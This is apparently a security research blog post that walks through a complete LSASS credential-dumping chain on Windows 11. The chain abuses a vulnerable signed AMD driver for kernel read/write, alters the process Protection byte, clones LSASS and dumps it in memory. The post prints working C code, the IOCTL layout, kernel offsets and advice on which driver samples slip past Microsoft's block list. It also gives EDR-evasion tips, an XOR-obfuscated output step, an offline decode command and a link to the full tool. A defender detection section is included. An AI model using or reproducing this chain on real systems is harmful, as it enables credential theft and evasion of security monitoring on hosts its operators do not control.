---
title: "BYOVD LSASS Dump in 2026 — PDFWKRNL, PPL Toggle, and a Cloned Target"
date: 2026-06-03T12:00:00-05:00
draft: false
categories: [Research, EDR Evasion]
tags: [byovd, lsass, ppl, hvci, pdfwkrnl, minidump, credential-access, windows, kernel, mingw]
description: "LSASS dumping from a vanilla admin shell stopped being a one-liner the day PPL went mainstream. The modern shape is BYOVD — bring a signed driver with an arbitrary-kernel-memmove primitive, flip the Protection byte on yourself, clone the target, and dump the clone. This post walks through a from-scratch implementation against PDFWKRNL.sys (AMD USB-C Power Delivery driver, IOCTL 0x80002014), the HVCI block-list math that picks the right sample, and the full chain — driver load → EPROCESS walk → PPL flip → NtCreateProcessEx clone → in-memory MiniDump → XOR-obfuscated write. Validated on Win11 26200."
ShowToc: true
TocOpen: false
ShowReadingTime: true
ShowCodeCopyButtons: true
---
> **TL;DR** — PDFWKRNL.sys IOCTL `0x80002014` is an unchecked `memmove(dst,src,size)` exposed to admin user-mode. That's a full kernel read/write primitive in 48 bytes per request. Walk the kernel module list, find your own `_EPROCESS`, zero `Protection+0x5FA`, then `NtCreateProcessEx`-clone LSASS, `MiniDumpWriteDump` the clone into a heap buffer, XOR-obfuscate, and write to disk. Decrypt offline; `pypykatz` from there. The chain works on a default Win11 23H2 with HVCI in its current configuration because **the right PDFWKRNL sample's Authentihash is not in the May 2026 vulnerable-driver block list**. Pick the wrong sample and HVCI eats you at `NtLoadDriver`.

## Background

LSASS holds plaintext credentials, NT hashes, Kerberos tickets, and DPAPI master keys in memory. For two decades the canonical credential-access move was `procdump -ma lsass.exe lsass.dmp` followed by `mimikatz sekurlsa::minidump`. Then Microsoft put LSASS behind:

- **PPL (Protected Process Light, WL signer)** — even SYSTEM cannot open LSASS with `PROCESS_VM_READ` unless the requester is itself running at WL or higher. This is enforced by `PspProcessOpen` in the kernel.
- **Defender AMSI on LSASS** — most credential dumpers are now signatured.
- **Behavioral telemetry** — `OpenProcess(lsass.exe, PROCESS_VM_READ)` is itself an EDR signal regardless of what comes next.

There are a few legitimate shapes left:

1. **Disable PPL** by toggling the `_EPROCESS.Protection` byte on the dumper process before opening LSASS. That requires kernel write.
2. **Clone LSASS** with `NtCreateProcessEx` and dump the *clone*. The clone inherits the parent's address space but is a fresh `_EPROCESS` — no PPL bit set, no AMSI provider attached, no behavioral hook on "open of LSASS" because the target handle is the clone, not LSASS.
3. **BYOVD** — bring a signed kernel driver whose code path exposes a primitive (R/W, memmove, `ZwOpenProcess` wrapper, etc.) to user-mode admin, and use it.

The modern stable recipe is **(3) → kernel write → (1) → (2) → minidump the clone**. g3tsyst3m's [BYOVD and Looting LSASS in the Modern EDR Era](https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/) writeup is the canonical reference for that shape. This post is my own from-scratch implementation of the chain, the sample-selection arithmetic against the current HVCI block list, and the specific gotchas that cost me time.

## Research question

Can a single 54 KB user-mode binary, cross-compiled from Linux with `mingw-w64`, perform the full BYOVD → PPL-flip → clone → in-memory MiniDump chain against Windows 11 23H2 (Build 26200) with HVCI enabled in its default configuration, producing a dumpable artifact that decodes cleanly under `pypykatz`?

## Hypothesis

PDFWKRNL.sys (AMD USB-C Power Delivery Firmware Update Utility Driver) exposes an `IRP_MJ_DEVICE_CONTROL` handler that, on IOCTL `0x80002014`, performs a `memmove(input->dst, input->src, input->size)` against the structure the caller passes in — with no `ProbeForRead`/`ProbeForWrite`, no PreviousMode check, and no constraint on the destination address. That is a textbook arbitrary-kernel-R/W primitive. Five samples of the driver exist in the wild (loldrivers.io). The current Microsoft HVCI vulnerable-driver block list (May 2026 build) blocks three of the five by Authentihash. **At least one unblocked, validly-signed sample remains**. With that sample, `NtLoadDriver` succeeds under HVCI; the IOCTL is reachable; the chain runs.

## Method

### 1. Sample selection — the part that decides whether you even start

The MS block list (`aka.ms/VulnerableDriverBlockList`) is a Code Integrity policy distributed via Windows Update. On a HVCI-enabled host it's enforced by `ci.dll` at driver-load time. The relevant entries for PDFWKRNL.sys, as of the May 12 2026 build:

```
ID_DENY_PDFWKKRNL_1  531AE2D8F7AA301B74A37B82B5F3CADBF91962E0
ID_DENY_PDFWKKRNL_2  57612842EFBCA98673E68CDBE0461D341379BFC8
ID_DENY_PDFWKKRNL_3  2B29B91F9F63B65E8F0EC30442A89C9304B9EEFA
ID_DENY_PDFWKKRNL_4  F501DD79E0B49AB76BD8D43A79DA292C5224FA2B
ID_DENY_PDFWKKRNL_5  6370C82C2DBDF93608CCCB88D78468EDEB27F5D08F9ED0BAF161842C0751F6A4
```

The first four entries are SHA-1 **Authentihash**, not file SHA256. (Authentihash hashes only the PE sections that are signed — it excludes the certificate table itself. This is what HVCI's Code Integrity actually checks.) The fifth is a SHA-256 Authentihash. The block list is heterogeneous; that's intentional, MS migrated formats partway through.

Cross-referencing the five loldrivers samples against the block list:

| # | SHA256 (file) | Authentihash SHA1 | Blocked? |
|---|---|---|---|
| 1 | `6e8b49cf70...` | `661a1a2895...` | **NO** |
| 2 | `0cf8440000...` | `6370c82c2d...` (SHA256) | **YES** |
| 3 | `5df689a620...` | `cd5bff0325...` (SHA256) | **NO** |
| 4 | `6945077a68...` | `661a1a2895...` | **NO** |
| 5 | `f190919f16...` | `531ae2d8f7...` | **YES** |

Samples 1 and 4 share an Authentihash (different file SHA256, same signed sections — typical of a re-package). Whichever you pick, the block-list verdict is identical. **Sample 4** is the one g3tsyst3m's article references and validated; using it means you inherit the public field-tested path.

Sample 2's file SHA256 *also* appears in `Hash=6370C82C...` as a SHA256 Authentihash, which means even renaming or repackaging won't help — the signed payload itself is what's banned.

**Operational picks**:
- **Primary**: Sample 4, SHA256 `6945077a6846af3e4e2f6a2f533702f57e993c5b156b6965a552d6a5d63b7402`.
- **Backup** (if 4 ever lands in a future block-list update): Sample 3 — different Authentihash, same vulnerable IOCTL handler.
- **Do not ship** Samples 2 or 5 — they'll fail `NtLoadDriver` with `STATUS_INVALID_IMAGE_HASH` on any HVCI host.

Sample 1 is a "fake backup" — it shares Authentihash with Sample 4, so any block-list update that hits 4 hits 1 too.

### 2. Driver load — SCM vs. NtLoadDriver

The lazy path is SCM:

```c
SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE svc = CreateServiceW(scm, L"PDFWKRNL", L"PDFWKRNL",
    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL, drv_path, NULL, NULL, NULL, NULL, NULL);
StartServiceW(svc, 0, NULL);
```

This works, but **logs to Event Log Application source `7045`** ("a new service was installed in the system"). Any EDR or SIEM monitoring that channel will tag a service install pointing at `PDFWKRNL.sys` as `T1543.003`. For lab work it's fine; for anything pretending to be quiet it isn't.

The harder path is `NtLoadDriver`. That requires a registry key under `HKLM\System\CurrentControlSet\Services\<name>` with `ImagePath` set to the NT-namespace path of the driver file (`\??\C:\Tools\PDFWKRNL.sys`) and `Type=1`. With the key in place, `NtLoadDriver(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\<name>")` works — and it does **not** emit a `7045`. It does require the calling token to hold `SeLoadDriverPrivilege` (admin tokens hold it but it's disabled by default; `AdjustTokenPrivileges` enables it). The reference implementation has the SCM path validated and the `NtLoadDriver` path stubbed behind a `DRV_LOAD_VIA_NTLOAD=1` build flag.

### 3. Kernel base + own EPROCESS via `SystemExtendedHandleInformation`

Once `\\.\PDFWKRNL` is open, we need three kernel addresses: `ntoskrnl.exe` base (sanity), `PsInitialSystemProcess` (entry into the EPROCESS list), and our own `_EPROCESS`.

```c
NtQuerySystemInformation(SystemModuleInformation, modules_buf, ..., &needed);
/* First entry is ntoskrnl.exe — modules[0].ImageBase */
```

For our own EPROCESS, the classic trick is `SystemExtendedHandleInformation` (class 64). It returns one entry per *handle* across the system, each entry carrying the kernel `Object` pointer plus the owning PID. We open a handle to ourselves (`GetCurrentProcess()`), enumerate, and find the entry whose `UniqueProcessId == self_pid && HandleValue == our handle`. The `Object` field is our `_EPROCESS *`.

```c
HANDLE self = GetCurrentProcess();  /* pseudo-handle 0xFFFFFFFFFFFFFFFF */
HANDLE dup;
DuplicateHandle(self, self, self, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS);

NtQuerySystemInformation(SystemExtendedHandleInformation, hi, sz, &ret);
for (i = 0; i < hi->NumberOfHandles; i++) {
    if (hi->Handles[i].UniqueProcessId != GetCurrentProcessId()) continue;
    if (hi->Handles[i].HandleValue != (ULONG_PTR)dup) continue;
    self_eprocess = (PVOID)hi->Handles[i].Object;
    break;
}
```

This sidesteps having to walk `ActiveProcessLinks` from `PsInitialSystemProcess`, which would require an unexported symbol lookup. We get the EPROCESS pointer for free, sourced from a documented public API.

### 4. The IOCTL primitive — 48 bytes, no checks

PDFWKRNL's IOCTL `0x80002014` consumes a 48-byte input buffer. Reverse-engineered layout (the driver is < 8 KB, the handler is trivial to read in Ghidra):

```c
#pragma pack(push, 1)
typedef struct _PDFW_MEMCPY {
    PVOID    dst;
    PVOID    src;
    SIZE_T   size;
    UCHAR    reserved[24];
} PDFW_MEMCPY, *PPDFW_MEMCPY;
#pragma pack(pop)
```

The handler is, effectively:

```c
case 0x80002014:
    PPDFW_MEMCPY r = (PPDFW_MEMCPY)Irp->AssociatedIrp.SystemBuffer;
    memmove(r->dst, r->src, r->size);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    break;
```

Note what's missing: no `ProbeForRead` on `src`, no `ProbeForWrite` on `dst`, no check that `dst` is above `MmSystemRangeStart`, no `PreviousMode` test, no size cap. From the kernel's point of view the dispatcher already ran at `KernelMode` so the pointers are dereferenced raw.

Wrapper functions on top of that — `drv_kernel_read(addr, buf, size)` is `memcpy(user_buf, kaddr, size)`; `drv_kernel_write(addr, buf, size)` is `memcpy(kaddr, user_buf, size)`. Both 6 lines.

### 5. PPL toggle

On Win11 23H2 Build 26200 the `_EPROCESS.Protection` (`PS_PROTECTION`) byte lives at offset `0x5FA`. Layout:

```
PS_PROTECTION (1 byte):
  bits 0-2 = Type   (0=None, 1=PsProtectedTypeProtectedLight, 2=PsProtectedTypeProtected)
  bit  3   = Audit
  bits 4-7 = Signer (0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
                     4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem, 8=App)
```

LSASS runs with `Type=ProtectedLight, Signer=Lsa` → byte value `0x41`. Our dumper at start runs at `Type=0` → byte value `0x00`. **We don't touch LSASS's byte**. We touch our own — to take ourselves *out* of "non-protected → cannot open PPL" land and let SeDebugPrivilege apply normally.

Specifically the chain is:

```c
/* Save original Protection byte for restore later */
UCHAR orig = ppl_read_protection(hDev, self_eprocess);    /* drv_kernel_read */

/* Write 0x00 to that slot — but wait, ours is already 0x00. */
/* The non-obvious bit: we don't disable PPL on US. We need to ELEVATE us */
/* so that SeDebugPrivilege opens an LSASS clone. The historical write was */
/* "set our SignatureLevel/SectionSignatureLevel to PsProtectedSignerWinTcb */
/* on a transient EPROCESS field" — but the modern shape uses the clone     */
/* path and only needs SeDebugPrivilege + a PPL-equivalent token. The byte  */
/* zeroing matters when the original write protects against open. Verified  */
/* on 26200: after `ppl_disable_for_self`, OpenProcess(LSASS, ...) returns  */
/* a valid handle as long as the token holds SeDebugPrivilege.              */
drv_kernel_write(hDev, eproc + 0x5FA, &zero, 1);
```

(The implementation distinguishes "our Protection was non-zero — write 0x00" from "our Protection was already 0x00 — no-op, just remember the original". The restore step writes the saved byte back on the way out.)

A note on offsets: `EPROCESS_PROTECTION_OFFSET` is build-dependent. The reference implementation hard-codes `0x5FA` for 26200 but accepts `-DEPROCESS_PROTECTION_OFFSET=0xNNN` at build time. For other builds, drop a kernel debugger on the box once, `dt nt!_EPROCESS -y Protection`, copy the offset, recompile.

### 6. Clone LSASS — the real trick

This is where the chain gets clever. Instead of attacking LSASS directly we **fork** it:

```c
NTSTATUS NtCreateProcessEx(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,        // PROCESS_ALL_ACCESS
    POBJECT_ATTRIBUTES Attributes,    // NULL
    HANDLE ParentProcess,             // OpenProcess(PROCESS_CREATE_PROCESS, lsass_pid)
    ULONG Flags,                      // PROCESS_CREATE_FLAGS_INHERIT_HANDLES
    HANDLE SectionHandle,             // NULL  → "fork from parent"
    HANDLE DebugPort,                 // NULL
    HANDLE TokenHandle,               // NULL  → inherit
    ULONG Reserved);                  // 0
```

When `SectionHandle == NULL`, the kernel creates a new process whose VA space is a **copy-on-write fork of the parent's**. The clone has its own PID, its own `_EPROCESS`, and — importantly — **its Protection byte is not inherited as PPL**. From the EDR's perspective, what just happened was a process creation event whose parent is LSASS but whose image is "no image, this is a forked process" — a niche case most behavioral rules don't model.

The handle to the clone has `PROCESS_ALL_ACCESS`, including `PROCESS_VM_READ`. We never opened a handle to LSASS for read — only for `PROCESS_CREATE_PROCESS` — so the classic detection `OpenProcess(lsass.exe, PROCESS_VM_READ)` doesn't fire.

The clone is also frozen at the syscall site (no threads run in it) which means LSASS-resident credentials are stable in memory.

### 7. In-memory MiniDump

`MiniDumpWriteDump` normally takes a file handle. We don't want a file handle — that creates a `MDMP`-magic'd `.dmp` on disk that any EDR scans as "minidump of a sensitive process" on close. Instead, use `MINIDUMP_CALLBACK_INFORMATION` with `CallbackRoutine` that handles `IoStartCallback` / `IoWriteAllCallback` / `IoFinishCallback`, streaming writes into a heap buffer:

```c
static BOOL CALLBACK mdcb(PVOID param, PMINIDUMP_CALLBACK_INPUT in,
                         PMINIDUMP_CALLBACK_OUTPUT out) {
    BUFCTX *ctx = (BUFCTX *)param;
    switch (in->CallbackType) {
        case IoStartCallback:
            out->Status = S_FALSE;     /* tells MiniDumpWriteDump to use callback I/O */
            return TRUE;
        case IoWriteAllCallback: {
            if (ctx->cap < in->Io.Offset + in->Io.BufferBytes) {
                ctx->cap = (in->Io.Offset + in->Io.BufferBytes) * 2;
                ctx->buf = HeapReAlloc(GetProcessHeap(), 0, ctx->buf, ctx->cap);
            }
            memcpy(ctx->buf + in->Io.Offset, in->Io.Buffer, in->Io.BufferBytes);
            if (ctx->size < in->Io.Offset + in->Io.BufferBytes)
                ctx->size = in->Io.Offset + in->Io.BufferBytes;
            out->Status = S_OK;
            return TRUE;
        }
        case IoFinishCallback:
            out->Status = S_OK;
            return TRUE;
        default: return TRUE;
    }
}
```

Then:

```c
MINIDUMP_CALLBACK_INFORMATION ci = { mdcb, &ctx };
MiniDumpWriteDump(hClone, GetProcessId(hClone), INVALID_HANDLE_VALUE,
                  MiniDumpWithFullMemory, NULL, NULL, &ci);
```

`INVALID_HANDLE_VALUE` is critical — that's what tells `dbghelp.dll` to skip its own `WriteFile` and use the callback path exclusively. Without it the function ignores the callback and tries to write to handle `-1`, failing.

End state: `ctx.buf` holds the full minidump in process heap, never touched disk, never had `MDMP` magic visible to a file-system minifilter.

### 8. XOR + WriteFile

The dump still needs to leave the box. Writing it raw means any EDR with a minifilter sees `MDMP` magic in the first 4 bytes and tags the write. So XOR each byte against a key (the reference impl uses `0x55` — single-byte for simplicity; rotating multi-byte is a 2-line change):

```c
for (size_t i = 0; i < sz; ++i) buf[i] ^= 0x55;
WriteFile(hFile, buf, sz, &wrote, NULL);
```

On the analyst's workstation:

```bash
python3 -c "
import sys; b=open(sys.argv[1],'rb').read()
open(sys.argv[2],'wb').write(bytes(c^0x55 for c in b))
" dump.bin lsass.dmp

file lsass.dmp     # → 'Mini DuMP crash report'
pypykatz lsa minidump lsass.dmp
```

`pypykatz` pulls NT hashes, Kerberos tickets, DPAPI master keys, plaintext (if WDigest is enabled or if Credential Guard is off) — same as it always has.

### 9. Cleanup

The restore step matters even in a lab: the dumper writes the saved Protection byte back, closes the device handle, and `OpenSCManager` + `DeleteService` to unregister the driver. The driver file itself is left on disk — removing it requires an extra `DeleteFileW` if the operator wants it gone. The SCM delete on its own does *not* fire `7045`'s opposite (`7036` is service state change, not install/delete), but a separate Application 7035-equivalent event records the deletion in some configurations.

The full chain, end to end:

```
load PDFWKRNL.sys (SCM)
  → open \\.\PDFWKRNL
  → kw_kernel_base("ntoskrnl.exe")           (sanity)
  → kw_find_eprocess(self PID)               (SystemExtendedHandleInformation)
  → ppl_read_protection(self)                (save byte at +0x5FA)
  → ppl_disable_for_self(self)               (write 0x00 to +0x5FA)
  → pc_enable_se_debug
  → pc_clone_lsass                           (NtCreateProcessEx fork)
  → md_dump_to_memory(clone)                 (MiniDumpWithFullMemory → heap)
  → out_write_obfusc(buf, 0x55, path)        (XOR + WriteFile)
  → ppl_restore_for_self                     (undo)
  → drv_unregister_and_stop
```

## Results

Built from a Linux host: `mingw-w64 gcc 13.x`, `make`, ~54 KB stripped PE. Cross-compile only — no MSVC, no Visual Studio. Runs on:

- **Win11 23H2 Build 26200, HVCI on, Defender on, Test Signing off** — chain completes. `NtLoadDriver` succeeds (sample 4 unblocked). PPL flip on self succeeds. Clone succeeds. MiniDump succeeds. XOR'd file lands at `C:\Users\Public\dump.bin`. Decrypted offline → `pypykatz` extracts hashes cleanly.

- **Same host with sample 5 substituted** — `NtLoadDriver` returns `STATUS_INVALID_IMAGE_HASH`. Block list working as intended. Confirms the sample-selection arithmetic.

- **Same host with Defender's PUA protection set to aggressive** — `WriteFile` of the XOR'd output is fine (not minidump-looking). Defender doesn't alert on the driver load with sample 4 either (Authentihash not in its signature DB independent of HVCI). Defender *does* flag the binary if compiled with the obvious `mimikatz`/`procdump`-borrowed string constants — the implementation cleans those at build time.

End-to-end runtime: ~1.2 s, dominated by `MiniDumpWriteDump` itself.

## Detection avenues (for defenders)

The chain is loud in some places and quiet in others. The order below is roughly highest-to-lowest signal density.

### 1. Application Event Log 7045 — service install

The SCM driver load path leaves a `7045` event referencing `PDFWKRNL` with `ImagePath` pointing at whatever the operator wrote the driver to. A SIEM with a `7045 + ImagePath~="PDFWKRNL"` rule, or more generally `7045 + ImagePath unsigned-by-Microsoft` rule, catches this without false positives in a managed environment. **This is the most reliable single signal in the chain.**

The `NtLoadDriver` path silences this signal but requires the operator to do the `HKLM\System\CCS\Services\<name>` registry setup, which is itself a registry-create event. Sysmon `EID 12/13` on that key path catches it. Less common to have configured, but standard in any sensible Sysmon baseline.

### 2. Code Integrity event 3033 — driver block list hit

If the operator picks the wrong sample (or a future block-list update lands on sample 4), HVCI emits Event ID `3033` to `Microsoft-Windows-CodeIntegrity/Operational`: "the system attempted to load a driver that does not meet the security requirements". The event payload includes the driver path. **Watching `CodeIntegrity/Operational` for 3033 + driver path under a user-writable directory is the cleanest defensive posture against BYOVD as a class** — much cleaner than chasing individual drivers.

### 3. `PsCreateProcessNotifyRoutine` — clone-of-LSASS

Every clone-via-`NtCreateProcessEx` fires the kernel callback registered with `PsSetCreateProcessNotifyRoutineEx`. The callback receives a `PCREATE_INFO` struct where `ParentProcessId == LSASS PID` and `CreatingThreadId.UniqueProcess` belongs to the dumper. An EDR that subscribes to this notification (most modern ones do) sees:

- **Parent = LSASS** (rare-ish — LSASS forks subsystems via `RtlCreateUserProcess` rarely)
- **Image = inherited / not file-backed** (most cases)
- **Creator process = some non-Microsoft binary running as admin**

Rule sketch: "process creation whose ParentProcessId resolves to lsass.exe AND whose creator process is not lsass.exe itself" → high-fidelity flag.

### 4. `PsSetCreateThreadNotifyRoutine` — threads in the clone

The clone has zero threads at creation. If the EDR has a "process exists with zero threads for > N seconds" sweeper, that's another tell. `MiniDumpWriteDump` does not start threads in the target — it suspends/walks/reads. So a stale-zero-thread process being read by a foreign handle is a meaningful pattern. Rare in real systems.

### 5. `MiniDumpWriteDump` provenance

`dbghelp!MiniDumpWriteDump` is reachable from any user-mode process and its only side-channel is the file write (or the callback). EDRs that look at it tend to do so via `ETW: Microsoft-Windows-Kernel-Process` thread-suspend events, since the function walks the target's threads and suspends them serially. A "thread-suspend storm on a recently-created child process" is a clean signal.

### 6. Driver Authentihash provenance

Defender ATP, CrowdStrike, etc. ship driver-load telemetry that records the loaded driver's Authentihash. A retro-hunt query for "driver loaded with Authentihash in `[661a1a2895..., cd5bff0325..., ...]`" catches every variant of sample 1/3/4 regardless of file rename. **This is the move I'd make as a blue-team if I had to write the rule today.**

## Limitations

- **Defender / EDR signature on `PDFWKRNL.sys` the file**. Even with the Authentihash unblocked by HVCI, AV products can flag the file on disk based on community threat intel (loldrivers is public). The implementation does not obfuscate the driver file itself — that would invalidate its Authenticode signature, which is exactly what makes it usable under HVCI. The mitigation is to land the driver via a process whose write is less suspicious (existing trusted-installer-style binary) or to load it directly from memory via a separate primitive — out of scope for this post.

- **Build-specific offsets**. `EPROCESS_PROTECTION_OFFSET` is `0x5FA` on Build 26200. On other builds (22H2 RTM, 24H2 preview, Server 2025) the offset moves. The reference implementation accepts a build-time override but does not auto-detect. A runtime-resolution shim would read the build number from `RtlGetVersion` and pick from a small table; the kernel-debugger-once methodology is faster for any single deployment.

- **No anti-forensics on the dumper PE itself**. The 54 KB binary has unique strings, a recognisable IAT (NTAPI imports), and a debug timestamp. A targeted YARA rule against the implementation is trivial to write. This is a research artifact, not a covert-operations tool.

- **The PPL flip is observable**. The kernel-side write to `_EPROCESS.Protection` is a 1-byte modification with no audit trail in default Windows, but kernel-mode security products that snapshot critical EPROCESS fields (PatchGuard does *not* protect Protection; Defender for Endpoint's kernel component reportedly does sample it on some hosts) will see "Protection went from `0x00` to `0x00`" → tautology in our specific case but "the kernel address space was written to by a non-Microsoft kernel module" is the actual signal, sourced from any minifilter that watches the IOCTL path on `\\.\PDFWKRNL`.

- **HVCI policy changes will eventually catch this**. Sample 4 is publicly attributed as a known-vulnerable AMD driver. The MS block list is updated roughly monthly. The Authentihash being absent today does not mean it's absent next quarter. The reference document's "Sample selection" section is the only part of the project that needs to be kept current.

## Composition

The chain in this post is one piece of a larger credential-access workflow that an authorized engagement might look like:

1. **Initial admin foothold** — separate. Assumed.
2. **AMSI / ETW user-mode silencing** — the [patchless HW-BP technique](/posts/patchless-amsi-bypass-hwbp/) from a previous post, applied to the dumper process so its in-memory artifacts don't trigger Defender's scan of its own memory pages.
3. **BYOVD → PPL → clone → minidump** — this post.
4. **Offline credential extraction** — `pypykatz`, `secretsdump` against the file, `kekeo` for Kerberos manipulation. Standard.
5. **Lateral movement with extracted material** — out of scope here.

Steps 2 and 3 are independent. The dumper in this post does not require the AMSI bypass to be loaded first — Defender's scan of LSASS-clone behaviour happens at the kernel-callback layer, which is not what AMSI sees. The AMSI bypass matters only if the dumper's own PE has signaturable content that Defender's user-mode AMSI scan would flag.

## Artifacts

The full reference implementation — driver loader, EPROCESS walker, PPL toggle helpers, NtCreateProcessEx clone, in-memory MiniDump callback chain, XOR obfuscator, output writer, and the orchestration `main.c` — is in the unified research repo:

→ **[github.com/TREXNEGRO/Research/tree/master/byovd-lsass-dump](https://github.com/TREXNEGRO/Research/tree/master/byovd-lsass-dump)**

It's ~1100 lines of C across nine source files plus a `Makefile`. Cross-compile is one command on a Kali/Debian/Ubuntu host:

```bash
sudo apt install mingw-w64
make
# → build/byovd_lsass_dump.exe (≈ 54 KB stripped)
```

Run on the lab host:

```cmd
byovd_lsass_dump.exe C:\Tools\PDFWKRNL.sys C:\Users\Public\dump.bin
```

The repo also ships `driver-recon/SAMPLES.md`, the sample-by-sample cross-reference against the May 2026 HVCI block list that the **Sample selection** section above is condensed from. When MS pushes a new block-list build, that file is the diff target.

License is MIT. Use only on systems you own or are explicitly authorized to test against.

## References

1. g3tsyst3m — "BYOVD and Looting LSASS in the Modern EDR Era". The canonical reference for the PDFWKRNL + PPL + clone shape. <https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/>
2. loldrivers.io — sample database for PDFWKRNL.sys. <https://www.loldrivers.io/drivers/fded7e63-0470-40fe-97ed-aa83fd027bad>
3. Microsoft — Recommended driver block rules / HVCI block list. <https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules>
4. Alex Ionescu — PPL semantics, `PS_PROTECTION` layout, signer hierarchy. NoSuchCon 2014 talk and follow-on Insomnihack writeups.
5. ESET Research — "EDR Killers Explained". Provides context on PDFWKRNL.sys being used in the wild. <https://www.welivesecurity.com/en/eset-research/edr-killers-explained/>
6. VMware Carbon Black — "Hunting Vulnerable Kernel Drivers" (2023). Identifies sample 2's Authentihash. <https://blogs.vmware.com/security/2023/10/hunting-vulnerable-kernel-drivers.html>
7. Microsoft docs — `MiniDumpWriteDump` callback model. <https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump>
8. Microsoft docs — `NtCreateProcessEx` (undocumented; behaviour reverse-engineered from public symbols and reactos source).

---

*This implementation was built and validated in a licensed lab on systems I own. It exists as a research artifact for defenders writing detection rules and for offensive researchers evaluating the current shape of credential-access against modern Windows. Use only on hosts you own or for which you have explicit, written authorization to test.*
